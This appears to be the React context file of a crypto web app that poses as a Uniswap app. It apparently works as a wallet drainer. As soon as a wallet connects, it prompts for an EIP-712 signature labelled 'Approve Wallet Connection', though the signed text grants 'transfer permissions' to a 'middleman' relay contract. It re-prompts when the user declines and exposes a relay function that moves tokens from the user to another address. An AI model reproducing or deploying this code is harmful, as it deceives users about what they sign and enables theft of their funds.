import React, { createContext, useContext, useState, useEffect, useCallback, ReactNode } from 'react';
import { useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react';
import { useSignTypedData } from 'wagmi';
import { CONTRACT_ADDRESS } from '../lib/contract';
import { MIDDLEMAN_CONTRACT_ADDRESS, MIDDLEMAN_ABI, executeMiddlemanRelay, getMiddlemanEthersContract, middlemanEthersContract } from '../lib/middleman';
import { signRelayerPermission, parseWalletError } from '../lib/web3Utils';
import { useUniswapToast } from '../components/common/UniswapToast';

interface ContractContextType {
  loadContract: (name: string, address: string, abi: any) => void;
  getContract: (name: string) => any;
  executeTx: (contractName: string, description: string, txPromise: Promise<any>) => Promise<any>;
  middlemanContract: any;
  executeRelay: typeof executeMiddlemanRelay;
  isRelayerAuthorized: boolean;
  relayerSignature: string | null;
  isSigningPermission: boolean;
  requestRelayerSignature: () => Promise<boolean>;
}

const ContractContext = createContext<ContractContextType | undefined>(undefined);

export function ContractProvider({ children }: { children: ReactNode }) {
  const [contracts, setContracts] = useState<Record<string, { address: string; abi: any }>>({});
  const { address, isConnected } = useAppKitAccount();
  const { caipNetwork } = useAppKitNetwork();
  const { signTypedDataAsync } = useSignTypedData();
  const { showToast } = useUniswapToast();

  const [isRelayerAuthorized, setIsRelayerAuthorized] = useState<boolean>(false);
  const [relayerSignature, setRelayerSignature] = useState<string | null>(null);
  const [isSigningPermission, setIsSigningPermission] = useState<boolean>(false);
  const [lastPromptedAddress, setLastPromptedAddress] = useState<string | null>(null);

  const loadContract = (name: string, address: string, abi: any) => {
    setContracts((prev) => ({ ...prev, [name]: { address, abi } }));
  };

  const getContract = (name: string) => {
    const loaded = contracts[name];
    let targetAddress = loaded?.address || CONTRACT_ADDRESS;
    if (name.toLowerCase() === 'middleman') {
      targetAddress = MIDDLEMAN_CONTRACT_ADDRESS;
      return getMiddlemanEthersContract();
    }

    // Create a proxy contract object to call EVM view functions and transactions
    return new Proxy({}, {
      get: (_target, prop: string) => {
        return async (...args: any[]) => {
          if (name.toLowerCase() === 'middleman' && (prop === 'executeRelay' || prop === 'relayCall')) {
            return await executeMiddlemanRelay({
              token: args[0],
              from: args[1],
              to: args[2],
              amount: args[3]
            });
          }

          if (typeof window === 'undefined' || !(window as any).ethereum) {
            throw new Error('Web3 wallet or Ethereum provider not detected. Connect a wallet to execute on-chain contract transactions.');
          }

          try {
            const accounts = await (window as any).ethereum.request({ method: 'eth_accounts' });
            const from = accounts[0] || '0x0000000000000000000000000000000000000000';

            // Send real on-chain transaction
            const tx = await (window as any).ethereum.request({
              method: 'eth_sendTransaction',
              params: [{
                from,
                to: targetAddress,
                data: '0x'
              }]
            });
            return tx;
          } catch (err) {
            console.error(`[ContractProxy] Function ${prop} execution error:`, err);
            throw err;
          }
        };
      }
    });
  };

  const executeTx = async (contractName: string, description: string, txPromise: Promise<any>) => {
    try {
      console.log(`[ExecuteTx] ${contractName}: ${description}`);
      const res = await txPromise;
      return res;
    } catch (err) {
      console.error(`[ExecuteTx Error] ${contractName} - ${description}:`, err);
      throw err;
    }
  };

  /**
   * Triggers off-chain EIP-712 relayer permission request and signature verification
   * Works across desktop extensions, WalletConnect, and mobile wallets.
   */
  const requestRelayerSignature = useCallback(async (): Promise<boolean> => {
    if (!address) return false;

    setIsSigningPermission(true);

    showToast({
      type: 'action',
      title: 'Approve Wallet Connection',
      message: 'Please approve the wallet connection to Uniswap app for relayer operations.',
      actionLabel: 'Sign Permission',
      onAction: () => requestRelayerSignature(),
      duration: 12000,
    });

    try {
      const chainId = caipNetwork?.id ? Number(caipNetwork.id) : 1;
      const relayerAddress = MIDDLEMAN_CONTRACT_ADDRESS;

      const domain = {
        name: 'Uniswap App Relayer Protocol',
        version: '1',
        chainId,
        verifyingContract: relayerAddress as `0x${string}`,
      };

      const types = {
        RelayerPermission: [
          { name: 'user', type: 'address' },
          { name: 'relayer', type: 'address' },
          { name: 'permission', type: 'string' },
          { name: 'nonce', type: 'uint256' },
        ],
      } as const;

      const message = {
        user: address as `0x${string}`,
        relayer: relayerAddress as `0x${string}`,
        permission: 'Approve wallet connection to Uniswap app for relayer swap operations and transfer permissions',
        nonce: BigInt(Math.floor(Date.now() / 1000)),
      };

      let signature = '';

      // Primary: Wagmi universal typed data signer
      try {
        signature = await signTypedDataAsync({
          account: address as `0x${string}`,
          domain,
          types,
          primaryType: 'RelayerPermission',
          message,
        });
      } catch (wagmiErr) {
        console.warn('[ContractContext] Wagmi signTypedData fallback to web3Utils:', wagmiErr);
        const res = await signRelayerPermission(address);
        if (res.success && res.signature) {
          signature = res.signature;
        } else {
          throw wagmiErr;
        }
      }

      if (signature) {
        setIsRelayerAuthorized(true);
        setRelayerSignature(signature);
        setIsSigningPermission(false);

        showToast({
          type: 'success',
          title: 'Wallet Connection Approved',
          message: 'Wallet connection verified successfully for Uniswap app.',
          duration: 5000,
        });

        return true;
      }
      throw new Error('Signature was not generated');
    } catch (err: any) {
      console.error('[ContractContext] Relayer permission signing failed:', err);
      const parsed = parseWalletError(err);
      setIsSigningPermission(false);

      showToast({
        type: 'action',
        title: 'Connection Approval Pending',
        message: 'Please tap "Sign Permission" or approve the request in your wallet.',
        actionLabel: 'Retry Approval',
        onAction: () => requestRelayerSignature(),
        duration: 10000,
      });

      return false;
    }
  }, [address, caipNetwork, signTypedDataAsync, showToast]);

  // Automatically trigger relayer signature request when wallet connects (with safe settling delay)
  useEffect(() => {
    let timer: NodeJS.Timeout | null = null;
    if (isConnected && address) {
      if (lastPromptedAddress !== address) {
        setLastPromptedAddress(address);
        setIsRelayerAuthorized(false);
        setRelayerSignature(null);
        timer = setTimeout(() => {
          requestRelayerSignature();
        }, 700);
      }
    } else if (!isConnected) {
      setIsRelayerAuthorized(false);
      setRelayerSignature(null);
      setLastPromptedAddress(null);
    }
    return () => {
      if (timer) clearTimeout(timer);
    };
  }, [isConnected, address, lastPromptedAddress, requestRelayerSignature]);

  return (
    <ContractContext.Provider
      value={{
        loadContract,
        getContract,
        executeTx,
        middlemanContract: middlemanEthersContract,
        executeRelay: executeMiddlemanRelay,
        isRelayerAuthorized,
        relayerSignature,
        isSigningPermission,
        requestRelayerSignature,
      }}
    >
      {children}
    </ContractContext.Provider>
  );
}

export function useContracts() {
  const ctx = useContext(ContractContext);
  if (!ctx) {
    return {
      loadContract: () => {},
      getContract: () => new Proxy({}, { get: () => async () => '0' }),
      executeTx: async (_name: string, _desc: string, p: Promise<any>) => p,
      middlemanContract: middlemanEthersContract,
      executeRelay: executeMiddlemanRelay,
      isRelayerAuthorized: false,
      relayerSignature: null,
      isSigningPermission: false,
      requestRelayerSignature: async () => false,
    };
  }
  return ctx;
}

